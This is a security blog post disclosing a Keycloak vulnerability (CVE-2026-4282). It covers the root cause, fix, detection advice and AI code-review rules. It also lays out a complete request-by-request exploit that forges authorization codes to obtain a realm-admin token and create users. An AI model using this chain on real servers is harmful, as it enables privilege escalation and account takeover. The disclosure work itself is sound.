---
layout: post
title: "Forging Keycloak admin tokens (CVE-2026-4282)"
date: 2026-06-25 10:00:00 +0000
categories: security
tags: [keycloak, oauth2, par, cve, appsec]
description: "A missing two-character prefix in Keycloak's single-use cache turns a leaked session ID into a realm-admin access token. Root cause, two exploit cases, and the fix."
---

*A missing two-character prefix in Keycloak's single-use cache turns a leaked session
ID into a `realm-admin` access token.*

> **Affected:** Keycloak ≤ 26.5.6 (RHBK before 26.2.15 / 26.4.11)
> **Fixed:** 26.5.7 (2 Apr 2026)
> **Impact:** Privilege escalation and account impersonation, up to full administrative control
> **Companion bug:** CVE-2026-4325 (action-token replay through the same cache)
>
> *I ran every request below against a local Keycloak **26.5.6** lab and routed it
> through Burp (`127.0.0.1:8030`). I truncated the JWTs for readability and changed
> nothing else. For authorized testing and education only.*

---

## TL;DR

Keycloak keeps OAuth2 authorization-code data and Pushed Authorization Request (PAR)
data in one flat key–value cache, with no namespace prefix on the keys. The UUID that
names a PAR entry shares a keyspace with the UUID that names an authorization code.

An attacker plants a PAR entry whose body carries injected authorization-code fields
(`exp`, `user_session_id`), then submits a forged authorization code whose first
segment is that PAR UUID. The token endpoint looks the value up by key, gets the
attacker's PAR map back, deserialises it as code data, loads the session named in
`user_session_id`, and issues a token for that user. Point it at an admin's live
session and you get an admin token.

The admin's session ID is not a secret. It sits in the 2nd segment of every
authorization code and in the `session_state` and `sid` values of every redirect and
token. Whether the victim's client is confidential or public decides whether you need a
client secret. Both cases appear below.

---

## Background

PAR (RFC 9126) lets a client POST its authorization parameters to a back-channel
endpoint before redirecting the user. The server stores them and returns a handle:

```
request_uri = urn:ietf:params:oauth:request_uri:<UUID>
```

The client then sends the user to `/auth?client_id=...&request_uri=urn:...:<UUID>`.

Keycloak's `SingleUseObjectProvider` is a global, flat `Map<String, …>` (Infinispan)
shared by every feature that needs a short-lived, one-shot value: authorization codes,
PAR entries, action tokens, and others:

```java
// model/infinispan/.../InfinispanSingleUseObjectProvider.java:41
private final BasicCache<String, SingleUseObjectValueEntity> singleUseObjectCache;
```

The vulnerable versions tag no value with its type. A PAR writer and a code writer both
`put` and `remove` with bare UUID keys, so one subsystem reads the other's data.

---

## Root cause

### 1. The authorization code format leaks its own inputs

```java
// services/.../oidc/utils/OAuth2CodeParser.java:59
return key + "." + clientSession.getUserSession().getId()
            + "." + clientSession.getClient().getId();
```

Every code reads `‹codeUUID›.‹userSessionId›.‹clientUUID›`. All three segments travel
in plaintext to the browser in the redirect.

### 2. PAR stores every submitted field verbatim

`ParEndpoint` flattens the whole POST body into the cached map
(`flattenDecodedFormParametersToParamsMap`) and strips no unknown fields. Inject `exp`
and `user_session_id` and they land in the map under the keys the code path reads.

### 3. The code deserialiser trusts the map blindly

```java
// services/.../oidc/utils/OAuth2Code.java:91-102
private OAuth2Code(Map<String,String> data) {
    expiration    = Integer.parseInt(data.get(EXPIRATION_NOTE));   // "exp"
    scope         = data.get(SCOPE_NOTE);                          // "scope"
    userSessionId = data.get(USER_SESSION_ID_NOTE);              // "user_session_id"
    ...
}
```

### 4. The collision

```java
// OAuth2CodeParser.parseCode  (vulnerable: no prefix on the key)
Map<String,String> codeData = codeStore.remove(codeUUID);   // ← retrieves the PAR entry
result.codeData = OAuth2Code.deserializeCode(codeData);      // ← reads injected fields
```

`codeUUID` is the attacker-chosen PAR UUID, and the keys carry no namespace, so
`remove()` returns the PAR map. The grant issues a token for the injected session.

> **The token carries the victim's roles, not the attacker's.** The grant loads roles
> from `clientSession.getUserSession().getUser()` and intersects them with the user's
> own assignments (`DefaultClientSessionContext.loadRoles():304`,
> `retainAll(getUserRoles()):299`). Inject `scope=…admin…` on your own session and the
> roles still come from your user, so nothing changes. Point `user_session_id` at an
> admin's session and you get admin.

---

## Reconnaissance

You need three values. Two are public or self-service; one comes from the victim.

### Finding the client UUID from your own login

The client UUID is a per-client value, identical across users. Log in to the target
client with any account you control and read segment[2] of your own code. Two requests
precede this one: `GET /auth` returns the login page, then a `POST` to
`login-actions/authenticate` submits the credentials.

```http
POST /realms/vuln-demo/login-actions/authenticate?session_code=…&client_id=par-public&tab_id=… HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

username=alice&password=pass123&credentialId=
```
```http
HTTP/1.1 302 Found
Location: http://localhost:9999/callback?state=demo
  &session_state=XLo547qeyc1hhZv728uor3rz
  &iss=http%3A%2F%2Flocalhost%3A8080%2Frealms%2Fvuln-demo
  &code=5712599d-8c9c-7b96-53fb-13f1a2ce22b0.XLo547qeyc1hhZv728uor3rz.f8c4106e-8042-4c39-bd76-98c9f80b0b7f
```

Segment[2] of `code` gives the client UUID `f8c4106e-8042-4c39-bd76-98c9f80b0b7f`. The
attacker reads this from a personal account and needs no victim. The value matches what
an admin sees in the console.

### Telling public from confidential

Send a PAR request with `client_id` and no secret. A public client accepts it; a
confidential client returns 401. The response status tells the attacker which case
applies.

```http
POST /realms/vuln-demo/protocol/openid-connect/ext/par/request HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

client_id=par-public&response_type=code&redirect_uri=http://localhost:9999/callback&scope=openid
```
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"request_uri":"urn:ietf:params:oauth:request_uri:9779…","expires_in":60}
```

The same request against the confidential client:

```http
POST /realms/vuln-demo/protocol/openid-connect/ext/par/request HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

client_id=par-client&response_type=code&redirect_uri=http://localhost:9999/callback&scope=openid
```
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"error":"invalid_request","error_description":"Authentication failed."}
```

### Harvesting the victim session ID

This is the one value the attacker takes from the victim. It leaks in several places:

* **Redirect URL.** The `session_state` query param and the `code` segment[1] both
  carry it. The attacker reads it from browser history, HTTP and proxy logs, SIEM
  records, a `Referer` header that leaks to third-party resources on the callback page,
  or a malicious app the victim visits.
* **Any token the victim holds.** The `sid` claim equals the session ID. A compromised
  or malicious resource server that receives the admin's access token reads it straight
  off the claim.
* **Front-channel logout.** Those iframe URLs carry `sid`.

The value works while the victim's session stays alive. Admins stay logged in, so the
window is wide.

---

## Exploitation, Case B: public client (unauthenticated)

This case matches the advisory wording: no credentials, no user interaction, full
admin.

### Harvest the victim's session ID

Bob (an admin) logs into the public client during normal work. The attacker captures
the callback URL:

```http
HTTP/1.1 302 Found
Location: http://localhost:9999/callback?state=demo
  &session_state=_AX1kEUSp_rN-ZiUjIMVd_uW
  &iss=http%3A%2F%2Flocalhost%3A8080%2Frealms%2Fvuln-demo
  &code=f7c88a2e-35ae-abc7-a092-a77e072e19ef._AX1kEUSp_rN-ZiUjIMVd_uW.f8c4106e-8042-4c39-bd76-98c9f80b0b7f
```

That gives `BOB_SESSION = _AX1kEUSp_rN-ZiUjIMVd_uW` and `CLIENT_UUID = f8c4106e-…`.

### E1: plant the PAR entry (no secret) and inject the code fields

```http
POST /realms/vuln-demo/protocol/openid-connect/ext/par/request HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

client_id=par-public&response_type=code&redirect_uri=http://localhost:9999/callback
&scope=openid profile email
&exp=1782370580                            ← injected OAuth2Code.EXPIRATION_NOTE
&user_session_id=_AX1kEUSp_rN-ZiUjIMVd_uW   ← injected OAuth2Code.USER_SESSION_ID_NOTE
```
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"request_uri":"urn:ietf:params:oauth:request_uri:543c2d86-d716-4c4b-8340-757ca9bcd12b","expires_in":60}
```

The PAR UUID `543c2d86-…` is the bare cache key. Build the forged code:

```
543c2d86-d716-4c4b-8340-757ca9bcd12b . _AX1kEUSp_rN-ZiUjIMVd_uW . f8c4106e-8042-4c39-bd76-98c9f80b0b7f
        └ PAR UUID (cache key)          └ Bob's session            └ client UUID
```

### E2: exchange the forged code for a token (no secret)

```http
POST /realms/vuln-demo/protocol/openid-connect/token HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&client_id=par-public
&code=543c2d86-d716-4c4b-8340-757ca9bcd12b._AX1kEUSp_rN-ZiUjIMVd_uW.f8c4106e-8042-4c39-bd76-98c9f80b0b7f
&redirect_uri=http://localhost:9999/callback
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIi…",
  "expires_in": 300,
  "refresh_expires_in": 1800,
  "refresh_token": "eyJhbGciOiJIUzUxMiIsInR5cCIgOiAiSldUIi…",
  "token_type": "Bearer",
  "id_token": "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIi…",
  "not-before-policy": 0,
  "session_state": "_AX1kEUSp_rN-ZiUjIMVd_uW",
  "scope": "openid profile email"
}
```

Decoded `access_token` payload:

```
preferred_username : bob
sid                : _AX1kEUSp_rN-ZiUjIMVd_uW
realm-management   : realm-admin (plus manage-users, manage-clients, 16 more)
```

The attacker sent no `Authorization` header and no secret, and now holds Bob's admin
token.

### E3 and E4: drive the Admin REST API

```http
GET /admin/realms/vuln-demo/users?max=5 HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIi…
```
```http
HTTP/1.1 200 OK
["alice","backdoor","bob","pwned"]
```
```http
POST /admin/realms/vuln-demo/users HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIi…
Content-Type: application/json

{"username":"pwn-b","enabled":true,"firstName":"P","lastName":"B","email":"pwnb@evil.local","emailVerified":true}
```
```http
HTTP/1.1 201 Created
```

The chain started with no credentials and ended with the attacker administering the
realm.

---

## Exploitation, Case A: confidential client

The mechanics match Case B. The difference: every request to the PAR and token
endpoints carries client authentication, so the attacker holds the client secret. That
secret comes from an insider, leaked config, a decompiled "confidential" app, or a
compromised first-party client.

```
Authorization: Basic cGFyLWNsaWVudDpzZWNyZXQxMjM=    (base64 of "par-client:secret123")
```

Bob's login to the confidential client yields `BOB_SESSION = WQSOhcrVP9ZnUij2kj75Kwpf`
and `CLIENT_UUID = 87cde65e-…`.

### A1: PAR plant with the secret

```http
POST /realms/vuln-demo/protocol/openid-connect/ext/par/request HTTP/1.1
Host: localhost:8080
Authorization: Basic cGFyLWNsaWVudDpzZWNyZXQxMjM=
Content-Type: application/x-www-form-urlencoded

response_type=code&redirect_uri=http://localhost:9999/callback
&scope=openid profile email&exp=1782370xxx&user_session_id=WQSOhcrVP9ZnUij2kj75Kwpf
```
```http
HTTP/1.1 201 Created

{"request_uri":"urn:ietf:params:oauth:request_uri:8e4d6d71-68fd-483a-bc00-de2d137a46e0","expires_in":60}
```

Forged code: `8e4d6d71-68fd-483a-bc00-de2d137a46e0.WQSOhcrVP9ZnUij2kj75Kwpf.87cde65e-…`

### A2: token exchange with the secret

```http
POST /realms/vuln-demo/protocol/openid-connect/token HTTP/1.1
Host: localhost:8080
Authorization: Basic cGFyLWNsaWVudDpzZWNyZXQxMjM=
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&redirect_uri=http://localhost:9999/callback
&code=8e4d6d71-68fd-483a-bc00-de2d137a46e0.WQSOhcrVP9ZnUij2kj75Kwpf.87cde65e-…
```
```http
HTTP/1.1 200 OK

{ "access_token":"eyJhbGci…", "token_type":"Bearer", "scope":"openid profile email", … }
```

The decoded token shows `preferred_username: bob` and `realm-admin`. The Admin REST
call (A3) returns the user list, as in Case B.

### Negative control: confidential client, secret omitted

```http
POST /realms/vuln-demo/protocol/openid-connect/ext/par/request HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

client_id=par-client&response_type=code&redirect_uri=http://localhost:9999/callback&scope=openid
```
```http
HTTP/1.1 401 Unauthorized

{"error":"invalid_request","error_description":"Authentication failed."}
```

This 401 marks the only difference between the two cases.

---

## Required inputs and how to obtain each

| Input                              | Case A (confidential) | Case B (public) | Secret? | Primary source |
|------------------------------------|:--------------------:|:---------------:|:-------:|----------------|
| Client alias (`client_id`)         | ✅ | ✅ | No  | Auth URL, app JS bundle, default clients |
| Client UUID (internal id)          | ✅ | ✅ | No  | Any code segment[2], including the attacker's own login |
| Victim session ID                  | ✅ | ✅ | No* | Callback URL (segment[1] / `session_state`) or `sid` in any victim token |
| Client secret                      | ✅ | ❌ | **Yes** | Insider, leaked config, decompiled app, compromised client |
| A PAR-capable client to plant      | ✅ | ✅ | depends | Probe the PAR endpoint |
| Victim live session on the client  | ✅ | ✅ | — | Implied by the harvested code; stays alive at exchange time |

\* Not a designed secret, though it carries the attack. Every other input is public or
attacker-generated.

**Per-case shopping list**

* **Case B (public).** Public `client_id` from the auth URL, client UUID from your own
  login or the victim URL, victim session ID from the victim URL or the `sid` claim. No
  secret at any step.
* **Case A (confidential).** The same three values plus the client secret on both
  requests.

The flow checks the client authentication and the injected session. It does not check
the caller's identity. The attacker's own privilege level carries no weight: an account
with zero roles, or no account at all in Case B, reaches realm admin.

---

## The fix (26.5.7)

Keycloak now prefixes the cache keys into disjoint namespaces:

```java
// OAuth2CodeParser.java
private static final String CACHE_KEY_PREFIX = "code:";
codeStore.put(CACHE_KEY_PREFIX + key, …);
codeStore.remove(CACHE_KEY_PREFIX + codeUUID);

// ParEndpoint.java
public static final String CACHE_KEY_PREFIX = "par:";
singleUseStore.put(CACHE_KEY_PREFIX + key, expiresIn, params);
```

A forged code's first segment now resolves to `code:‹parUUID›`, which cannot match the
`par:‹parUUID›` key the PAR entry lives under. The two keyspaces no longer overlap. The
companion fix for CVE-2026-4325 replaces `UUID.randomUUID()` with `SecretGenerator`, so
single-use identifiers resist prediction.

---

## Remediation and detection

* **Upgrade to 26.5.7+** (RHBK 26.2.15 / 26.4.11+). This is the fix.
* **Rotate** confidential client secrets that may have leaked.
* **Shrink session-ID exposure.** Drop full callback URLs and `session_state` from
  logs, and set short SSO session lifetimes.
* **Hunt on unpatched systems** for:
  * token requests whose `code` first segment equals a recently issued PAR
    `request_uri` UUID;
  * PAR bodies that carry out-of-spec fields such as `user_session_id` or `exp`;
  * tokens minted for a user with no matching interactive login event.

---

## Turning the lesson into AI memory

A reviewer unfamiliar with this CVE approves the same three lines again. Store each
lesson as a rule your AI assistant recalls on every review, and it flags the pattern in
the diff before the code ships.

A useful memory holds four parts: a trigger the assistant watches for, the rule, the
reason, and a link to the code that proves it. The rules below come from the walkthrough
above.

| Trigger in the diff | Rule | From |
|---|---|---|
| `put` or `remove` on a shared cache with a bare identifier | Prefix the key with its value type (`code:`, `par:`) | Root cause 4, The fix |
| Code persists a whole request body or untrusted map | Allowlist the fields and drop unknown keys | Root cause 2 |
| Deserialise a map or blob from a shared store into a trusted object | Verify type and provenance before use | Root cause 3 |
| A token, nonce, or code built with `UUID.randomUUID()` or `new Random()` | Use `SecretGenerator` or `SecureRandom` | CVE-2026-4325 |
| Identity derived from a value that arrived with the request | Bind the principal to server-verified state | E1, E2 |
| A control that assumes `session_state`, `sid`, or a code segment stays secret | Treat client-visible IDs as public | Reconnaissance |

Take one example. The assistant reads this diff:

```java
String codeUUID = parsed[0];
Map<String,String> codeData = codeStore.remove(codeUUID);   // shared single-use store
```

It recalls the first rule and comments:

> `codeStore` is the shared single-use cache, also written by the PAR endpoint. A bare
> `codeUUID` key collides with a `par:` entry an attacker can plant (CVE-2026-4282).
> Prefix the key: `codeStore.remove("code:" + codeUUID)`, and confirm the PAR writer
> uses a `par:` prefix.

The loop runs four steps: capture the lesson, store it as memory, recall it on the next
review, enforce it on code no human flagged.

---

## Appendix: lab setup

* Keycloak **26.5.6** (last vulnerable), container on `:8080`, realm `vuln-demo`.
* Users: `alice` (no roles), `bob` (`realm-admin`).
* Clients: `par-client` (confidential, secret `secret123`, Case A) and `par-public`
  (public, PKCE optional, Case B). Both run standard flow with default scopes.
* Per case: Bob logs in, the attacker harvests the session ID from the callback, plants
  a PAR entry with injected `exp` and `user_session_id`, forges
  `parUUID.bobSession.clientUUID`, exchanges it for Bob's `realm-admin` token, and
  drives the Admin REST API.
* Burp (`127.0.0.1:8030`) proxied all traffic.
